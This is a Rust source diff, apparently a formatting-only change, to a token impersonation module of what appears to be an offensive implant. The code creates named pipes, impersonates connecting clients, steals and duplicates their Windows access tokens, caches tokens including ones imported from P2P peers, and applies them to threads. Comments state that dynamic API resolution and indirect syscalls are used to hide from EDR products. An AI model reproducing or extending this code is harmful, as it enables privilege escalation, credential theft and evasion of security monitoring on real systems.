@@ -47,14 +47,13 @@
 use anyhow::{anyhow, Context, Result};
 use rand::Rng;
 use std::collections::HashMap;
-use std::sync::{Mutex, OnceLock};
 use std::sync::atomic::{AtomicBool, Ordering};
-use winapi::um::winnt::{
-    HANDLE, TOKEN_DUPLICATE,
-    TOKEN_IMPERSONATE, TOKEN_QUERY,
-    SecurityImpersonation, TokenImpersonation,
-};
+use std::sync::{Mutex, OnceLock};
 use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
+use winapi::um::winnt::{
+    SecurityImpersonation, TokenImpersonation, HANDLE, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
+    TOKEN_QUERY,
+};
 /// Minimal token access for impersonation: TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY.
 ///
 /// P2-32: This is the minimum required set — no broad TOKEN_ALL_ACCESS mask.
@@ -88,11 +87,11 @@ unsafe fn get_last_error() -> u32 {
 use winapi::um::handleapi::INVALID_HANDLE_VALUE;
 // All function imports removed — resolved dynamically via pe_resolve or indirect
 // syscalls to eliminate IAT entries visible to EDR. Type-only imports retained.
-use winapi::um::winbase::WAIT_OBJECT_0;
-use winapi::um::winnt::TOKEN_TYPE;
 use winapi::shared::minwindef::{DWORD, LPVOID};
 use winapi::shared::ntdef::NTSTATUS;
+use winapi::um::winbase::WAIT_OBJECT_0;
 use winapi::um::winbase::{PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE};
+use winapi::um::winnt::TOKEN_TYPE;
 
 // ── Dynamic API resolution (IAT elimination) ────────────────────────────────
 //
@@ -144,33 +143,82 @@ where
 
 // ── advapi32.dll functions ──────────────────────────────────────────────────
 
-dynamic_fn!(GET_TOKEN_INFORMATION, b"advapi32.dll\0", b"GetTokenInformation\0",
-            unsafe extern "system" fn(HANDLE, DWORD, LPVOID, DWORD, *mut DWORD) -> i32);
+dynamic_fn!(
+    GET_TOKEN_INFORMATION,
+    b"advapi32.dll\0",
+    b"GetTokenInformation\0",
+    unsafe extern "system" fn(HANDLE, DWORD, LPVOID, DWORD, *mut DWORD) -> i32
+);
 
-dynamic_fn!(CONVERT_SID_TO_STRING_SID_A, b"advapi32.dll\0", b"ConvertSidToStringSidA\0",
-            unsafe extern "system" fn(LPVOID, *mut *mut i8) -> i32);
+dynamic_fn!(
+    CONVERT_SID_TO_STRING_SID_A,
+    b"advapi32.dll\0",
+    b"ConvertSidToStringSidA\0",
+    unsafe extern "system" fn(LPVOID, *mut *mut i8) -> i32
+);
 
-dynamic_fn!(LOOKUP_ACCOUNT_SID_A, b"advapi32.dll\0", b"LookupAccountSidA\0",
-            unsafe extern "system" fn(LPVOID, LPVOID, *mut i8, *mut DWORD, *mut i8, *mut DWORD, *mut DWORD) -> i32);
+dynamic_fn!(
+    LOOKUP_ACCOUNT_SID_A,
+    b"advapi32.dll\0",
+    b"LookupAccountSidA\0",
+    unsafe extern "system" fn(
+        LPVOID,
+        LPVOID,
+        *mut i8,
+        *mut DWORD,
+        *mut i8,
+        *mut DWORD,
+        *mut DWORD,
+    ) -> i32
+);
 
-dynamic_fn!(REVERT_TO_SELF, b"advapi32.dll\0", b"RevertToSelf\0",
-            unsafe extern "system" fn() -> i32);
+dynamic_fn!(
+    REVERT_TO_SELF,
+    b"advapi32.dll\0",
+    b"RevertToSelf\0",
+    unsafe extern "system" fn() -> i32
+);
 
 // ── kernel32.dll functions ──────────────────────────────────────────────────
 
-dynamic_fn!(LOCAL_FREE, b"kernel32.dll\0", b"LocalFree\0",
-            unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void);
+dynamic_fn!(
+    LOCAL_FREE,
+    b"kernel32.dll\0",
+    b"LocalFree\0",
+    unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void
+);
 
 // ── Named pipe functions (advapi32/kernel32) ────────────────────────────────
 
-dynamic_fn!(CONNECT_NAMED_PIPE, b"kernel32.dll\0", b"ConnectNamedPipe\0",
-            unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void) -> i32);
+dynamic_fn!(
+    CONNECT_NAMED_PIPE,
+    b"kernel32.dll\0",
+    b"ConnectNamedPipe\0",
+    unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void) -> i32
+);
 
-dynamic_fn!(CREATE_NAMED_PIPE_A, b"kernel32.dll\0", b"CreateNamedPipeA\0",
-            unsafe extern "system" fn(*const i8, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, *mut SECURITY_ATTRIBUTES) -> HANDLE);
+dynamic_fn!(
+    CREATE_NAMED_PIPE_A,
+    b"kernel32.dll\0",
+    b"CreateNamedPipeA\0",
+    unsafe extern "system" fn(
+        *const i8,
+        DWORD,
+        DWORD,
+        DWORD,
+        DWORD,
+        DWORD,
+        DWORD,
+        *mut SECURITY_ATTRIBUTES,
+    ) -> HANDLE
+);
 
-dynamic_fn!(IMPERSONATE_NAMED_PIPE_CLIENT, b"advapi32.dll\0", b"ImpersonateNamedPipeClient\0",
-            unsafe extern "system" fn(HANDLE) -> i32);
+dynamic_fn!(
+    IMPERSONATE_NAMED_PIPE_CLIENT,
+    b"advapi32.dll\0",
+    b"ImpersonateNamedPipeClient\0",
+    unsafe extern "system" fn(HANDLE) -> i32
+);
 
 // ── Indirect syscall for NtSetInformationThread (replaces SetThreadToken / RevertToSelf) ──
 
@@ -371,9 +419,7 @@ unsafe fn nt_open_thread_token(
     );
 
     if nt_error(status) {
-        Err(anyhow!(
-            "NtOpenThreadToken failed: NTSTATUS 0x{status:08X}"
-        ))
+        Err(anyhow!("NtOpenThreadToken failed: NTSTATUS 0x{status:08X}"))
     } else {
         Ok(token)
     }
@@ -421,9 +467,7 @@ unsafe fn nt_duplicate_token(
     );
 
     if nt_error(status) {
-        Err(anyhow!(
-            "NtDuplicateToken failed: NTSTATUS 0x{status:08X}"
-        ))
+        Err(anyhow!("NtDuplicateToken failed: NTSTATUS 0x{status:08X}"))
     } else {
         Ok(new_token)
     }
@@ -433,20 +477,18 @@ unsafe fn nt_duplicate_token(
 
 /// Query the user, domain, and SID from a token handle.
 fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
-    use winapi::um::winnt::{TOKEN_USER, TokenUser};
+    use winapi::um::winnt::{TokenUser, TOKEN_USER};
 
     // First call to get the required buffer size.
     let mut needed: DWORD = 0;
-    let get_token_info = resolve_fn(&GET_TOKEN_INFORMATION, b"advapi32.dll\0", b"GetTokenInformation\0")
-        .ok_or_else(|| anyhow!("failed to resolve GetTokenInformation dynamically"))?;
+    let get_token_info = resolve_fn(
+        &GET_TOKEN_INFORMATION,
+        b"advapi32.dll\0",
+        b"GetTokenInformation\0",
+    )
+    .ok_or_else(|| anyhow!("failed to resolve GetTokenInformation dynamically"))?;
     unsafe {
-        get_token_info(
-            token,
-            TokenUser,
-            std::ptr::null_mut(),
-            0,
-            &mut needed,
-        );
+        get_token_info(token, TokenUser, std::ptr::null_mut(), 0, &mut needed);
     }
 
     if needed == 0 {
@@ -474,8 +516,12 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
 
     // Convert SID to string.
     let mut sid_str: *mut i8 = std::ptr::null_mut();
-    let convert_sid = resolve_fn(&CONVERT_SID_TO_STRING_SID_A, b"advapi32.dll\0", b"ConvertSidToStringSidA\0")
-        .ok_or_else(|| anyhow!("failed to resolve ConvertSidToStringSidA dynamically"))?;
+    let convert_sid = resolve_fn(
+        &CONVERT_SID_TO_STRING_SID_A,
+        b"advapi32.dll\0",
+        b"ConvertSidToStringSidA\0",
+    )
+    .ok_or_else(|| anyhow!("failed to resolve ConvertSidToStringSidA dynamically"))?;
     let local_free_fn = resolve_fn(&LOCAL_FREE, b"kernel32.dll\0", b"LocalFree\0");
     let ok = unsafe { convert_sid(sid, &mut sid_str) };
     let sid_string = if ok != 0 && !sid_str.is_null() {
@@ -498,8 +544,12 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
     let mut domain_buf = [0u8; 256];
     let mut domain_len: DWORD = 256;
     let mut sid_type: DWORD = 0;
-    let lookup_sid = resolve_fn(&LOOKUP_ACCOUNT_SID_A, b"advapi32.dll\0", b"LookupAccountSidA\0")
-        .ok_or_else(|| anyhow!("failed to resolve LookupAccountSidA dynamically"))?;
+    let lookup_sid = resolve_fn(
+        &LOOKUP_ACCOUNT_SID_A,
+        b"advapi32.dll\0",
+        b"LookupAccountSidA\0",
+    )
+    .ok_or_else(|| anyhow!("failed to resolve LookupAccountSidA dynamically"))?;
     let ok = unsafe {
         lookup_sid(
             std::ptr::null_mut(),
@@ -543,7 +593,11 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     let ctx = &*(param as *const ImpersonationThreadCtx);
 
     // Wait for a client to connect (dynamically resolved — no IAT entry).
-    let connect_fn = match resolve_fn(&CONNECT_NAMED_PIPE, b"kernel32.dll\0", b"ConnectNamedPipe\0") {
+    let connect_fn = match resolve_fn(
+        &CONNECT_NAMED_PIPE,
+        b"kernel32.dll\0",
+        b"ConnectNamedPipe\0",
+    ) {
         Some(f) => f,
         None => {
             log::error!("token_impersonation: ConnectNamedPipe not resolved");
@@ -563,7 +617,11 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     }
 
     // Impersonate the pipe client on THIS helper thread (dynamically resolved).
-    let impersonate_fn = match resolve_fn(&IMPERSONATE_NAMED_PIPE_CLIENT, b"advapi32.dll\0", b"ImpersonateNamedPipeClient\0") {
+    let impersonate_fn = match resolve_fn(
+        &IMPERSONATE_NAMED_PIPE_CLIENT,
+        b"advapi32.dll\0",
+        b"ImpersonateNamedPipeClient\0",
+    ) {
         Some(f) => f,
         None => {
             log::error!("token_impersonation: ImpersonateNamedPipeClient not resolved");
@@ -583,7 +641,9 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     // Use Release ordering to ensure all prior writes (ImpersonateNamedPipeClient
     // side-effects, pipe state) are visible to the main thread when it loads
     // with Acquire ordering.
-    (*(param as *mut ImpersonationThreadCtx)).success.store(true, Ordering::Release);
+    (*(param as *mut ImpersonationThreadCtx))
+        .success
+        .store(true, Ordering::Release);
 
     // Keep the impersonation active until the main thread extracts the token.
     // The main thread will terminate this thread via NtClose on the handle.
@@ -606,8 +666,10 @@ pub fn init_from_config(config: &common::config::TokenImpersonationConfig) {
     });
 
     INITIALIZED.store(true, std::sync::atomic::Ordering::SeqCst);
-    log::info!("token_impersonation: initialised (prefer_set_thread_token={})",
-        config.prefer_set_thread_token);
+    log::info!(
+        "token_impersonation: initialised (prefer_set_thread_token={})",
+        config.prefer_set_thread_token
+    );
 }
 
 /// Whether the module has been initialised and is enabled.
@@ -659,17 +721,29 @@ pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
         format!(r"\\.\pipe\{}", pipe_name)
     };
 
-    let config = CONFIG.get().ok_or_else(|| anyhow!("token_impersonation not initialised"))?;
+    let config = CONFIG
+        .get()
+        .ok_or_else(|| anyhow!("token_impersonation not initialised"))?;
 
-    log::info!("token_impersonation: creating pipe '{full_path}' (strategy={})",
-        if config.prefer_set_thread_token { "SetThreadToken" } else { "ImpersonationThread" });
+    log::info!(
+        "token_impersonation: creating pipe '{full_path}' (strategy={})",
+        if config.prefer_set_thread_token {
+            "SetThreadToken"
+        } else {
+            "ImpersonationThread"
+        }
+    );
 
     // Create the named pipe (dynamically resolved — no IAT entry).
     let pipe_path_c = std::ffi::CString::new(full_path.as_str())
         .map_err(|e| anyhow!("invalid pipe path: {e}"))?;
 
-    let create_pipe_fn = resolve_fn(&CREATE_NAMED_PIPE_A, b"kernel32.dll\0", b"CreateNamedPipeA\0")
-        .ok_or_else(|| anyhow!("failed to resolve CreateNamedPipeA dynamically"))?;
+    let create_pipe_fn = resolve_fn(
+        &CREATE_NAMED_PIPE_A,
+        b"kernel32.dll\0",
+        b"CreateNamedPipeA\0",
+    )
+    .ok_or_else(|| anyhow!("failed to resolve CreateNamedPipeA dynamically"))?;
     let pipe_handle = unsafe {
         create_pipe_fn(
             pipe_path_c.as_ptr() as *mut _,
@@ -685,7 +759,9 @@ pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
 
     if pipe_handle == INVALID_HANDLE_VALUE {
         let err = unsafe { get_last_error() };
-        return Err(anyhow!("CreateNamedPipeA failed for '{full_path}': Win32 error {err}"));
+        return Err(anyhow!(
+            "CreateNamedPipeA failed for '{full_path}': Win32 error {err}"
+        ));
     }
 
     let result = if config.prefer_set_thread_token {
@@ -725,19 +801,23 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
         crate::syscall!(
             "NtCreateThreadEx",
             &mut thread_handle as *mut _ as u64,
-            THREAD_WAIT_ACCESS,                         // minimal thread access
+            THREAD_WAIT_ACCESS, // minimal thread access
             std::ptr::null::<u64>() as u64,
-            (-1isize) as u64,                    // NtCurrentProcess()
+            (-1isize) as u64, // NtCurrentProcess()
             impersonation_thread_entry as *const () as usize as u64,
             ctx_ptr as u64,
-            0u64,                                // CreateSuspended
-            0u64, 0u64, 0u64,
+            0u64, // CreateSuspended
+            0u64,
+            0u64,
+            0u64,
             std::ptr::null::<u64>() as u64,
         )
     };
 
     if create_status.is_err() || create_status.unwrap() < 0 || thread_handle == 0 {
-        return Err(anyhow!("NtCreateThreadEx failed for impersonation helper (SetThreadToken path)"));
+        return Err(anyhow!(
+            "NtCreateThreadEx failed for impersonation helper (SetThreadToken path)"
+        ));
     }
 
     // Wait for the helper thread to complete via NtWaitForSingleObject.
@@ -753,23 +833,32 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
     };
     if wait_result != WAIT_OBJECT_0 {
         let _ = crate::syscall!("NtClose", thread_handle as u64);
-        return Err(anyhow!("impersonation helper thread timed out (SetThreadToken path)"));
+        return Err(anyhow!(
+            "impersonation helper thread timed out (SetThreadToken path)"
+        ));
     }
 
     if !ctx.success.load(Ordering::Acquire) {
         let _ = crate::syscall!("NtClose", thread_handle as u64);
-        return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread (SetThreadToken path)"));
+        return Err(anyhow!(
+            "ImpersonateNamedPipeClient failed in helper thread (SetThreadToken path)"
+        ));
     }
 
     // Extract the impersonation token from the helper thread via NtOpenThreadToken.
     let token = unsafe {
-        nt_open_thread_token(thread_handle as *mut _, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, true)
-    }.context("failed to open helper thread token (SetThreadToken path)")?;
+        nt_open_thread_token(
+            thread_handle as *mut _,
+            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
+            true,
+        )
+    }
+    .context("failed to open helper thread token (SetThreadToken path)")?;
 
     // Duplicate the token for our own use.
-    let dup_token = unsafe {
-        nt_duplicate_token(token, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation)
-    }.context("failed to duplicate token from helper thread (SetThreadToken path)")?;
+    let dup_token =
+        unsafe { nt_duplicate_token(token, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation) }
+            .context("failed to duplicate token from helper thread (SetThreadToken path)")?;
 
     // Close the original token and the helper thread.
     nt_close_handle(token);
@@ -777,8 +866,13 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
     drop(ctx);
 
     // Query user/domain from the duplicated token.
-    let (user, domain, sid) = query_token_user(dup_token)
-        .unwrap_or_else(|_| ("(unknown)".to_string(), "(unknown)".to_string(), "(unknown)".to_string()));
+    let (user, domain, sid) = query_token_user(dup_token).unwrap_or_else(|_| {
+        (
+            "(unknown)".to_string(),
+            "(unknown)".to_string(),
+            "(unknown)".to_string(),
+        )
+    });
 
     // Apply the duplicated token to the current thread via NtSetInformationThread
     // (indirect syscall — no IAT entry, replacing SetThreadToken).
@@ -840,7 +934,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
         crate::syscall!(
             "NtCreateThreadEx",
             &mut thread_handle as *mut _ as u64, // ThreadHandle
-            THREAD_WAIT_ACCESS,                         // DesiredAccess (minimal)
+            THREAD_WAIT_ACCESS,                  // DesiredAccess (minimal)
             std::ptr::null::<u64>() as u64,      // ObjectAttributes
             (-1isize) as u64,                    // ProcessHandle = NtCurrentProcess()
             impersonation_thread_entry as *const () as usize as u64, // StartRoutine
@@ -876,20 +970,27 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
 
     if !ctx.success.load(Ordering::Acquire) {
         let _ = crate::syscall!("NtClose", thread_handle as u64);
-        return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread"));
+        return Err(anyhow!(
+            "ImpersonateNamedPipeClient failed in helper thread"
+        ));
     }
 
     // Extract the impersonation token from the helper thread via
     // NtOpenThreadToken.  This is an indirect syscall — EDR sees only
     // NtOpenThreadToken, not ImpersonateNamedPipeClient, on the main thread.
     let token = unsafe {
-        nt_open_thread_token(thread_handle as *mut _, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, true)
-    }.context("failed to open helper thread token")?;
+        nt_open_thread_token(
+            thread_handle as *mut _,
+            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
+            true,
+        )
+    }
+    .context("failed to open helper thread token")?;
 
     // Duplicate the token for our own use.
-    let dup_token = unsafe {
-        nt_duplicate_token(token, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation)
-    }.context("failed to duplicate token from helper thread")?;
+    let dup_token =
+        unsafe { nt_duplicate_token(token, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation) }
+            .context("failed to duplicate token from helper thread")?;
 
     // Close the original token and the helper thread.
     nt_close_handle(token);
@@ -897,15 +998,18 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
     drop(ctx); // Clean up the boxed context.
 
     // Query user/domain.
-    let (user, domain, sid) = query_token_user(dup_token)
-        .unwrap_or_else(|_| ("(unknown)".to_string(), "(unknown)".to_string(), "(unknown)".to_string()));
+    let (user, domain, sid) = query_token_user(dup_token).unwrap_or_else(|_| {
+        (
+            "(unknown)".to_string(),
+            "(unknown)".to_string(),
+            "(unknown)".to_string(),
+        )
+    });
 
     // Apply the token to the main thread via NtSetInformationThread.
     // This is the NT-native equivalent of SetThreadToken — even fewer EDRs
     // hook this because it's rarely used by legitimate applications.
-    let status = unsafe {
-        nt_set_impersonation_token(dup_token)
-    };
+    let status = unsafe { nt_set_impersonation_token(dup_token) };
 
     if nt_error(status) {
         nt_close_handle(dup_token);
@@ -969,7 +1073,7 @@ pub fn revert_token() -> Result<String> {
             target.ssn,
             target.gadget_addr,
             &[
-                (-1isize) as u64,  // NtCurrentThread pseudo-handle
+                (-1isize) as u64, // NtCurrentThread pseudo-handle
                 THREAD_IMPERSONATION_TOKEN as u64,
                 std::ptr::null::<u64>() as u64,
                 std::mem::size_of::<u64>() as u64,
@@ -1055,16 +1159,14 @@ pub fn list_tokens_json() -> String {
 /// Returns `None` if no tokens are cached or none are available.
 pub fn get_cached_token() -> Option<HANDLE> {
     let guard = cache_mut();
-    guard
-        .as_ref()
-        .and_then(|cache| {
-            // Prefer the active token, then fall back to any cached token.
-            cache
-                .values()
-                .find(|t| t.active)
-                .or_else(|| cache.values().next())
-                .map(|t| t.handle())
-        })
+    guard.as_ref().and_then(|cache| {
+        // Prefer the active token, then fall back to any cached token.
+        cache
+            .values()
+            .find(|t| t.active)
+            .or_else(|| cache.values().next())
+            .map(|t| t.handle())
+    })
 }
 
 /// Get metadata about the currently active token (user, domain).
@@ -1085,13 +1187,18 @@ pub fn get_active_token_info() -> Option<(String, String)> {
 /// This allows the P2P module to feed tokens from connecting peers into
 /// the token cache without going through the full pipe impersonation flow.
 pub fn import_token(token_handle: HANDLE, source: TokenSource) -> Result<String> {
-    let (user, domain, sid) = query_token_user(token_handle)
-        .unwrap_or_else(|_| ("(unknown)".to_string(), "(unknown)".to_string(), "(unknown)".to_string()));
+    let (user, domain, sid) = query_token_user(token_handle).unwrap_or_else(|_| {
+        (
+            "(unknown)".to_string(),
+            "(unknown)".to_string(),
+            "(unknown)".to_string(),
+        )
+    });
 
     // Duplicate the token so the caller can close their handle.
-    let dup_token = unsafe {
-        nt_duplicate_token(token_handle, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation)
-    }.context("failed to duplicate imported token")?;
+    let dup_token =
+        unsafe { nt_duplicate_token(token_handle, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation) }
+            .context("failed to duplicate imported token")?;
 
     let cached = CachedToken {
         handle: dup_token as usize,
@@ -1111,11 +1218,11 @@ pub fn import_token(token_handle: HANDLE, source: TokenSource) -> Result<String>
         cache.insert(source, cached);
     }
 
-    log::info!(
-        "token_impersonation: imported token for {domain}\\{user} from {source_desc}"
-    );
+    log::info!("token_impersonation: imported token for {domain}\\{user} from {source_desc}");
 
-    Ok(format!("Imported token for {domain}\\{user} from {source_desc}"))
+    Ok(format!(
+        "Imported token for {domain}\\{user} from {source_desc}"
+    ))
 }
 
 /// Apply a cached token to the current thread.  Used by integration points
@@ -1131,7 +1238,9 @@ pub fn apply_cached_token(source: Option<&TokenSource>) -> Result<()> {
             .ok_or_else(|| anyhow!("token cache not initialised"))?;
 
         let token = if let Some(src) = source {
-            cache.get(src).ok_or_else(|| anyhow!("token not found in cache"))?
+            cache
+                .get(src)
+                .ok_or_else(|| anyhow!("token not found in cache"))?
         } else {
             cache
                 .values()
@@ -1140,7 +1249,7 @@ pub fn apply_cached_token(source: Option<&TokenSource>) -> Result<()> {
                 .ok_or_else(|| anyhow!("no tokens in cache"))?
         };
 
-            (token.handle(), token.user.clone(), token.domain.clone())
+        (token.handle(), token.user.clone(), token.domain.clone())
     }; // guard dropped
 
     // Apply via NtSetInformationThread (indirect syscall — no IAT entry).
